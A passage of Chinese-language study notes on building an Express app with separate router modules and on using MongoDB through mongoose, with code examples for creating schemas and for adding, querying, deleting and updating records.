class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fs.<span class="title function_">readfile</span>(<span class="string">&#x27;./db.json&#x27;</span>,<span class="keyword">function</span>(<span class="params">err,data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;server error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">student</span>:<span class="title class_">JSON</span>.<span class="title function_">parse</span>(data).<span class="property">students</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>路由设计</p><p>请求方法、请求路径、get参数、post参数、备注</p></li><li><p>将 基本路由与app主要的东西分离开来 把app导出</p><p>运行 app.js 文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>);  <span class="comment">//!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public/&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;./public/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="title function_">router</span>(app);    <span class="comment">//!!!</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;running....&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">export</span> = app;</span><br><span class="line"></span><br><span class="line"><span class="comment">//router.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">app</span>)&#123;</span><br><span class="line">    app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>express 专门包装路由的方式</p><blockquote><p>app.js 职责：创建服务</p><p>​                    做一些服务相关配置:模板引擎、body-parser解析表单 post 请求体、提供静态资源服务</p><p>​                     挂载路由</p><p>​                     监听端口启动服务</p><p>router.js 职责：处理路由 根据不同的请求方法+路径 具体处理函数</p></blockquote><ol><li>创建路由容器 router</li><li>把路由都挂载到 router 路由容器中</li><li>导出 router</li><li>把路由挂载到app服务器上</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>);  <span class="comment">//!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public/&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;./public/&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(router);    <span class="comment">//挂载!!!</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;running....&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">export</span> = app;</span><br><span class="line"></span><br><span class="line"><span class="comment">//router.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,...);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,...);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></table></figure></li></ul><h2 id="6.-mongodb">6. MongoDB<a title="#6.-mongodb" href="#6.-mongodb"></a></h2><p><a href="https://www.runoob.com/mongodb/nosql.html" target="_blank">教程</a></p><h3 id="6.1-关系型数据库-和-非关系型数据库">6.1 关系型数据库 和 非关系型数据库<a title="#6.1-关系型数据库-和-非关系型数据库" href="#6.1-关系型数据库-和-非关系型数据库"></a></h3><ul><li><p>关系 === 表 (表与表之间存在关系)</p><blockquote><p>需要通过 sql 语言操作</p><p>操作之前要设计表结构</p><p>数据包支持约束</p></blockquote></li><li><p>非关系</p><blockquote><p>非常灵活</p><p>有的即使 key-value 键值对</p></blockquote><p>MongoDB 是长得最像 关系型数据库的 非关系型数据库</p><ul><li>数据库 -&gt; 数据库</li><li>数据表 -&gt; 集合/数组</li><li>表记录 -&gt; 文档对象</li><li>不需要设计表结构 可以任意存数据 没有结构性 比较灵活</li></ul></li></ul><h3 id="6.2-安装">6.2 安装<a title="#6.2-安装" href="#6.2-安装"></a></h3><p><a href="https://www.mongodb.com/try/download/community" target="_blank">下载</a></p><p>安装</p><p>配环境变量 : 命令行检查 <code>mongod --version</code></p><h3 id="6.3-启动、关闭、连接、退出连接数据库">6.3 启动、关闭、连接、退出连接数据库<a title="#6.3-启动、关闭、连接、退出连接数据库" href="#6.3-启动、关闭、连接、退出连接数据库"></a></h3><ul><li>启动：<code>mongod</code></li></ul><p>​        mongod 默认使用执行 mongod 命令所处盘符根目录下的 /data/db 作为自己的数据存储目录</p><p>​        第一次执行时应该提前创建一个 /data/db</p><ul><li><p>修改默认的数据存储目录 : <code>mongod --dbpath=数据存储目录路径</code></p></li><li><p>关闭 : ctrl + c / 关闭终端</p></li><li><p>连接 ： mongo (默认连接本机的 MongoDB 服务)</p></li><li><p>断开 ： exit (退出连接)</p></li></ul><h3 id="6.4-基本命令">6.4 基本命令<a title="#6.4-基本命令" href="#6.4-基本命令"></a></h3><ul><li><code>show dbs </code> : 查看显示所有数据库</li><li><code>db</code> : 查看当前操作的数据库</li><li><code>use 数据库名称</code> : 切换到指定的数据库(if 本无 —&gt; 创建后切换)</li><li><code>db.集合名称.insertOne(&#123;...&#125;)</code> : 插入数据 —&gt; 一个对象</li><li><code>db.集合名称.find()</code> : 查看这个集合的所有文档对象</li></ul><h3 id="6.5-在node中-操作-mongodb-数据">6.5 在node中 操作 mongoDB 数据<a title="#6.5-在node中-操作-mongodb-数据" href="#6.5-在node中-操作-mongodb-数据"></a></h3><ul><li><p>通过官方 <code>mongodb</code> 包操作 比较原生 一般不用</p><p><a href="https://github.com/mongodb/node-mongodb-native" target="_blank">教程</a></p></li><li><p>通过第三方包 <code>mogoose</code> 操作MongoDB 数据库</p><p>基于官方(上面)做的一个封装 <a href="https://mongoosejs.com/" target="_blank">官网</a></p><ol><li><p>下载包 <code>npm install mongodb --global</code></p></li><li><p>下载包 <code>npm install mongoose --save</code></p></li><li><p>写一个官网的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="comment">// 连接MongoDB数据库</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost:27017/test&#x27;</span>, &#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span>, <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个模型 设计数据库 Mongodb 是动态的 只需要在代码中设计数据库</span></span><br><span class="line"><span class="comment">// mongoose 这个包可以让你的设计编写过程变得非常简单</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Cat</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;Cat&#x27;</span>, &#123; <span class="attr">name</span>: <span class="title class_">String</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化一个cat</span></span><br><span class="line"><span class="keyword">const</span> kitty = <span class="keyword">new</span> <span class="title class_">Cat</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;Zildjian&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持久化保存 kitty实例</span></span><br><span class="line">kitty.<span class="title function_">save</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;meow&#x27;</span>));</span><br></pre></td></tr></table></figure></li><li><p>在 终端 运行 <code>node demo.js</code></p></li><li><p>可以在数据库查看</p><img src='https://s1.328888.xyz/2022/04/09/XKlCk.jpg' style="zoom:77%;" ></li></ol></li></ul><h4 id="6.5.1-mongoose">6.5.1 mongoose<a title="#6.5.1-mongoose" href="#6.5.1-mongoose"></a></h4><ul><li>官网：<a href="https://mongoosejs.com/">https://mongoosejs.com/</a></li><li>官方指南：<a href="https://mongoosejs.com/docs/guide.html">https://mongoosejs.com/docs/guide.html</a></li><li>官方api：<a href="https://mongoosejs.com/docs/api.html">https://mongoosejs.com/docs/api.html</a></li></ul><h4 id="6.5.2-mongodb-数据库的基本概念">6.5.2 MongoDB 数据库的基本概念<a title="#6.5.2-mongodb-数据库的基本概念" href="#6.5.2-mongodb-数据库的基本概念"></a></h4><ul><li><p>数据库</p></li><li><p>集合</p></li><li><p>文档 -&gt; 文档结构没有限制</p></li><li><p>很灵活</p><blockquote><p>在需要插入数据时 只需要指定往哪个数据库的哪个集合操作就可以了</p><p>其他都有 mongodb 自动完成建库建表</p></blockquote></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">qq</span>:&#123;                          <span class="comment">//数据库</span></span><br><span class="line">        <span class="attr">users</span>:[                   <span class="comment">// 集合 -&gt;数组</span></span><br><span class="line">            &#123;<span class="attr">name</span>:<span class="string">&#x27;li&#x27;</span>, <span class="attr">age</span>:<span class="number">15</span>&#125;,  <span class="comment">//文档 -&gt; 表记录 对象</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6.6-官方指南">6.6 官方指南<a title="#6.6-官方指南" href="#6.6-官方指南"></a></h3><h4 id="6.6.1-设计scheme-发布-model">6.6.1 设计Scheme 发布 Model<a title="#6.6.1-设计scheme-发布-model" href="#6.6.1-设计scheme-发布-model"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Schema</span> = mongoose.<span class="property">Schema</span>; <span class="comment">//创建设计结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.连接数据库</span></span><br><span class="line"><span class="comment">// 指定连接的数据库不需要存在，在插入第一条数据之后就会自动被创建处理</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/itcast&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设计集合/文档结构</span></span><br><span class="line"><span class="comment">// 字段名称就是表结构中的属性名称</span></span><br><span class="line"><span class="comment">// 约束的目的是为了保证数据的完整性 避免脏数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userSchame = <span class="keyword">new</span> <span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">require</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">password</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">require</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">email</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.讲文档结构发布为模型</span></span><br><span class="line"><span class="comment">//   mongoose.model 方法就是用来将一个架构发布为 model</span></span><br><span class="line"><span class="comment">//   第一个参数：传入一个大写名称单数字符串  User -&gt; 数据库名称</span></span><br><span class="line"><span class="comment">//               mongoose 会自动将大写名词的字符串 生成 小写复数  users -&gt;  集合名称</span></span><br><span class="line"><span class="comment">//   第二个参数：架构 Schema</span></span><br><span class="line"><span class="comment">//   返回值：模型对象/构造函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;User&#x27;</span>, userSchame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 当有了模型构造函数后 就可以使用构造函数对 users集合 中数据形象操作</span></span><br></pre></td></tr></table></figure><h4 id="6.6.2-增加数据">6.6.2 增加数据<a title="#6.6.2-增加数据" href="#6.6.2-增加数据"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> admin = <span class="keyword">new</span> <span class="title class_">User</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">  <span class="attr">email</span>: <span class="string">&#x27;admin@admin.com&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">admin.<span class="title function_">save</span>(<span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//console结果</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">_id</span>: 612124d035f7324bb036ea01,</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">  <span class="attr">email</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">  <span class="attr">__v</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6.6.3-查询数据">6.6.3 查询数据<a title="#6.6.3-查询数据" href="#6.6.3-查询数据"></a></h4><p>查到的数据都会放在 数组里[]</p><p>查不到就是 null</p><ol><li><p>查询所有</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">find</span>(<span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//ret</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: 612124d035f7324bb036ea01,</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    <span class="attr">email</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">    <span class="attr">__v</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>条件查找</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">find</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;zs&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ret</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: 612126bb120a184418be6b6d,</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;zs&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    <span class="attr">email</span>: <span class="string">&#x27;admin@admin.com&#x27;</span>,</span><br><span class="line">    <span class="attr">__v</span>: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>查询单个 if无条件 查第一个  <strong>&amp;  条件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;zs&#x27;</span>, <span class="attr">password</span>:<span class="string">&#x27;123456&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">    <span class="comment">// &amp; 条件 </span></span><br><span class="line"> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>|| 条件</strong>查询  <strong>$or:[]</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(</span><br><span class="line">    &#123; <span class="attr">$or</span>: [&#123;<span class="attr">username</span>: <span class="string">&#x27;zs&#x27;</span>&#125;, &#123;<span class="attr">password</span>:<span class="string">&#x27;123456&#x27;</span>&#125;] &#125;,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">    <span class="comment">// &amp; 条件 </span></span><br><span class="line">         <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="6.6.4-删除数据">6.6.4 删除数据<a title="#6.6.4-删除数据" href="#6.6.4-删除数据"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">User</span>.<span class="title function_">remove</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;zs&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ret</span></span><br><span class="line">&#123; <span class="attr">n</span>: <span class="number">1</span>, <span class="attr">ok</span>: <span class="number">1</span>, <span class="attr">deletedCount</span>: <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除 根据条件删除所有</span></span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findOneAndRemove</span>(&#123; conditions &#125;, [options], [callback])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除 根据id删除一个</span></span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findByIdAndRemove</span>(&#123; conditions &#125;, [options], [callback])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6.6.5-更新数据">6.6.5 更新数据<a title="#6.6.5-更新数据" href="#6.6.5-更新数据"></a></h4><p>第一个参数：id 之前控制 ret 出现的 id<br>第二个参数：修改的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个参数：id 之前控制 ret 出现的 id</span></span><br><span class="line"><span class="comment">// 第二个参数：修改的值</span></span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findByIdAndUpdate</span>(<span class="string">&#x27;612124d035f7324bb036ea01&#x27;</span>, &#123; <span class="attr">password</span>: <span class="string">&#x27;22222&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err, ret</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="6.7-mongoose-的-api-全部支持-promise">6.7 mongoose 的 api 全部支持 promise<a title="#6.7-mongoose-的-api-全部支持-promise" href="#6.7-mongoose-的-api-全部支持-promise"></a></h3><h4 id="6.7.1-查询数据">6.7.1 查询数据<a title="#6.7.1-查询数据" href="#6.7.1-查询数据"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// promise 查询所有</span></span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">find</span>().<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做一个用户注册案例 查找用户是否存在</span></span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;lsysxn&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">user</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (user) &#123;</span><br><span class="line">    <span class="comment">// 用户存在</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;always exist&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(&#123;</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&#x27;lsysxn&#x27;</span>,</span><br><span class="line">      <span class="attr">password</span>: <span 